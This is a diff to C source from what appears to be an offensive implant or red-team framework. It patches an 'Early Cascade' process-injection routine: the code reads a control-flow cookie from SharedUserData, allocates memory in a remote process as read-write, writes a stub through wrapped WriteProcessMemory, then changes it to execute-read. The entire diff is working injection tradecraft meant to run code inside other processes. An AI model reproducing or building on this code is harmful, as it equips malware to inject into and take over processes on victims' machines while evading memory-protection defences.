@@ -231,9 +231,10 @@ BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPV
 	/* KCFG cookie at SharedUserData+0x330 (zero -> identity) */
 	cookie = (unsigned long long)(*(unsigned int *)(0x7FFE0330));
 
-	/* stub remote allocation */
+	/* stub remote allocation: RW first (the write path is a direct
+	 * syscall against the page), flip to RX after the write settles */
 	remoteStub = (unsigned char *)beacon_VirtualAllocEx(context->hProcess, NULL, EC_STUB_SIZE,
-	                                                    MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ);
+	                                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 	if (remoteStub == NULL) {
 		spawn_log("ec: VirtualAllocEx failed gle=", (long)GetLastError());
 		return FALSE;
@@ -252,6 +253,13 @@ BOOL inject_via_earlycascade(INJECTCONTEXT * context, LPVOID lpStartAddress, LPV
 	if (!beacon_WriteProcessMemory(context->hProcess, remoteStub, stub, EC_STUB_SIZE, &got) || got != EC_STUB_SIZE) {
 		spawn_log("ec: stub write failed gle=", (long)GetLastError());
 		return FALSE;
+	}
+	{
+		DWORD oldp = 0;
+		if (!beacon_VirtualProtectEx(context->hProcess, remoteStub, EC_STUB_SIZE, PAGE_EXECUTE_READ, &oldp)) {
+			spawn_log("ec: protect->RX failed gle=", (long)GetLastError());
+			return FALSE;
+		}
 	}
 
 	/* g_ShimsEnabled = 1 */
